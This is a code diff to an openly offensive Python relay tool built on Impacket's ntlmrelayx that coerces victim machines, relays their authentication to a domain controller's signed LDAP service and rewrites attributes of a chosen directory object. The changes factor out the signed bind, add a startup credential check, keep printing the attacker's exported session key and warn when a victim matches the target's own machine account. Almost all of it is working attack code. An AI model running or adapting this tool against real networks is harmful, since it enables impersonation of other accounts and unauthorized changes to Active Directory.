@@ -86,6 +86,33 @@ def resolve_ntlmrelayx(explicit=None):
                      "or pass -ntlmrelayx /path/to/ntlmrelayx.py")
 
 
+def signed_ldap_bind(conn):
+    """Authenticate the attacker's own signed LDAP session (NTLM by default, Kerberos with -k)."""
+    if use_kerberos:
+        conn.kerberosLogin(username, password, domain, lmhash, nthash,
+                           kdcHost=ldap_ip, useCache=False)
+    else:
+        conn.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
+
+
+def validate_bootstrap():
+    """Bind once at startup so broken credentials fail before any coercion begins."""
+    try:
+        conn = LDAPConnection(
+            f"ldap://{ldap_host}", args.base_dn,
+            dstIp=ldap_ip, signing=True, timeout=8,
+        )
+    except Exception as error:
+        raise SystemExit(f"[-] Cannot reach ldap://{ldap_host}: {error}")
+    try:
+        signed_ldap_bind(conn)
+        print(f"[+] Bootstrap identity validated: {domain}\\{username}", flush=True)
+    except Exception as error:
+        raise SystemExit(f"[-] Bootstrap bind as {domain}\\{username} failed: {error}")
+    finally:
+        conn.close()
+
+
 def ldap_message(operation):
     message = LDAPMessage()
     message["messageID"] = random.randrange(1, 2147483647)
@@ -182,23 +209,15 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             f"ldap://{ldap_host}", args.base_dn,
             dstIp=ldap_ip, signing=True, timeout=8,
         )
-        if use_kerberos:
-            self.raw.kerberosLogin(username, password, domain, lmhash, nthash,
-                                   kdcHost=ldap_ip, useCache=False)
-        else:
-            self.raw.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
+        signed_ldap_bind(self.raw)
         print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
         # Log the exported SASL session key of our own connection -- the key we sign
         # the same-record frame with, and the key the DC verifies that frame under.
+        # NTLM keys stay in a login()-local variable upstream, so only Kerberos exposes one.
         try:
             if self.raw._LDAPConnection__auth_type == "KRB5":
                 key = self.raw._LDAPConnection__sessionKey
-            else:
-                cipher = self.raw._LDAPConnection__spnego_cipher_blob
-                key = getattr(cipher, "_SPNEGOCipher__randomSessionKey", None) or \
-                      getattr(cipher, "randomSessionKey", None)
-            if key:
-                print(f"[key] attacker exported session key: {bytes(getattr(key, 'contents', key)).hex()}", flush=True)
+                print(f"[key] attacker exported session key: {bytes(key.contents).hex()}", flush=True)
         except Exception:
             pass
         self.session = self.raw
@@ -241,6 +260,11 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         if expected_victim and victim.casefold() != expected_victim.casefold():
             print(f"[-] Rejected unexpected victim {victim}", flush=True)
             return None, STATUS_ACCESS_DENIED
+
+        account = victim.split("\\")[-1]
+        if account.endswith("$") and account[:-1].casefold() == ldap_host.split(".", 1)[0].casefold():
+            print(f"[!] victim {victim} matches the relay target's own machine account; DCs refuse "
+                  f"same-machine reflection (LOGON_FAILURE) -- coerce a different host", flush=True)
 
         attribute, value = operation_value()
         final = SPNEGO_NegTokenResp()
@@ -286,11 +310,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
                 f"ldap://{ldap_host}", args.base_dn,
                 dstIp=ldap_ip, signing=True, timeout=8,
             )
-            if use_kerberos:
-                check.kerberosLogin(username, password, domain, lmhash, nthash,
-                                    kdcHost=ldap_ip, useCache=False)
-            else:
-                check.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
+            signed_ldap_bind(check)
             entries = check.search(
                 searchBase=args.modify_dn, scope=0,
                 searchFilter="(objectClass=*)", attributes=[attribute],
@@ -337,6 +357,8 @@ def main():
     ldap_ip = args.dc_ip or address
     expected_victim = args.victim.replace("/", "\\") if args.victim else None
     use_kerberos = args.use_kerberos
+
+    validate_bootstrap()
 
     relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
     configure_smb_listener()
